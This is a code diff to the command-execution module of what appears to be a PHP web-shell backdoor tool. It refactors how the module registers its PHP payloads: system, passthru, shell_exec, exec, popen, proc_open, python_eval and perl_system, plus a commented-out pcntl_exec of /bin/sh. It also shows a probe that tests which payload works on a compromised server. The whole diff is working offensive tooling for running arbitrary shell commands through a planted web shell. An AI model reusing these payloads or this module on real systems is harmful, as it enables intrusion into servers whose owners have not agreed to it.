@@ -5,7 +5,6 @@ Created on 22/ago/2011
 '''
 from core.moduleexception import ModuleException, ProbeException, ExecutionException, ProbeSucceed
 from core.moduleprobeall import ModuleProbeAll
-from core.vector import VectorList, Vector
 from core.savedargparse import SavedArgumentParser as ArgumentParser
 from argparse import SUPPRESS
 import random
@@ -16,26 +15,24 @@ WARN_SH_INTERPRETER_FAIL = 'Shell interpreters load failed'
 class Sh(ModuleProbeAll):
     '''Shell to execute system commands'''
 
-    def _init_vectors(self):
-        self.vectors = VectorList([
-                Vector('shell.php', "system", "system('$cmd$stderr');"),
-                Vector('shell.php', "passthru" , "passthru('$cmd$stderr');"),
-                Vector('shell.php', "shell_exec", "echo shell_exec('$cmd$stderr');"),
-                Vector('shell.php', "exec", "exec('$cmd$stderr', $r); echo(join(\"\\n\",$r));"),
-    #            Vector('shell.php', "pcntl", ' $p = pcntl_fork(); if(!$p) {{ pcntl_exec( "/bin/sh", Array("-c", "$cmd")); }} else {{ pcntl_waitpid($p,$status); }}'),
-                Vector('shell.php', "popen", "$h = popen('$cmd','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);"),
-                Vector('shell.php', "python_eval", "python_eval('import os; os.system('$cmd$stderr');"),
-                Vector('shell.php', "perl_system", "$perl = new perl(); $r = @perl->system('$cmd$stderr'); echo $r;"),
-                Vector('shell.php', "proc_open", """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
-    $h = proc_open('$cmd', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));
-    while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
-    fclose($pipes[2]); proc_close($h);"""),
-                ])
+    def _set_vectors(self):
+        self.vectors.add_vector("system", 'shell.php', "system('$cmd$stderr');")
+        self.vectors.add_vector("passthru" , 'shell.php', "passthru('$cmd$stderr');")
+        self.vectors.add_vector("shell_exec", 'shell.php', "echo shell_exec('$cmd$stderr');")
+        self.vectors.add_vector("exec", 'shell.php',  "exec('$cmd$stderr', $r); echo(join(\"\\n\",$r));")
+        #self.vectors.add_vector("pcntl", 'shell.php', ' $p = pcntl_fork(); if(!$p) {{ pcntl_exec( "/bin/sh", Array("-c", "$cmd")); }} else {{ pcntl_waitpid($p,$status); }}'),
+        self.vectors.add_vector("popen", 'shell.php', "$h = popen('$cmd','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);")
+        self.vectors.add_vector("python_eval", 'shell.php', "python_eval('import os; os.system('$cmd$stderr');")
+        self.vectors.add_vector("perl_system", 'shell.php', "$perl = new perl(); $r = @perl->system('$cmd$stderr'); echo $r;")
+        self.vectors.add_vector("proc_open", 'shell.php', """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
+$h = proc_open('$cmd', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));
+while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
+fclose($pipes[2]); proc_close($h);""")
     
-    def _init_args(self):
+    def _set_args(self):
         self.argparser.add_argument('cmd', help='Shell command', nargs='+' )
         self.argparser.add_argument('-stderr', help='Print standard error output', action='store_const', const=False, default=True)
-        self.argparser.add_argument('-vector', choices = self.vectors.get_names())
+        self.argparser.add_argument('-vector', choices = self.vectors.keys())
         self.argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
     
     def _init_module(self):
@@ -48,7 +45,7 @@ class Sh(ModuleProbeAll):
             
         # Execute if is current vector is saved or choosen
         if self.current_vector.name in (self.stored_args['vector'], self.args['vector'])  :
-            self._result = self.current_vector.execute(self.modhandler, self.args_formats)
+            self._result = self.current_vector.execute( self.args_formats)
         
         
     def _prepare_vector(self):
@@ -72,7 +69,7 @@ class Sh(ModuleProbeAll):
         slacky_formats = self.args_formats.copy()
         slacky_formats['cmd'] = 'echo %s' % (rand)
         
-        if self.current_vector.execute(self.modhandler, slacky_formats) == rand:
+        if self.current_vector.execute( slacky_formats) == rand:
             
             self.stored_args['vector'] = self.current_vector.name
             
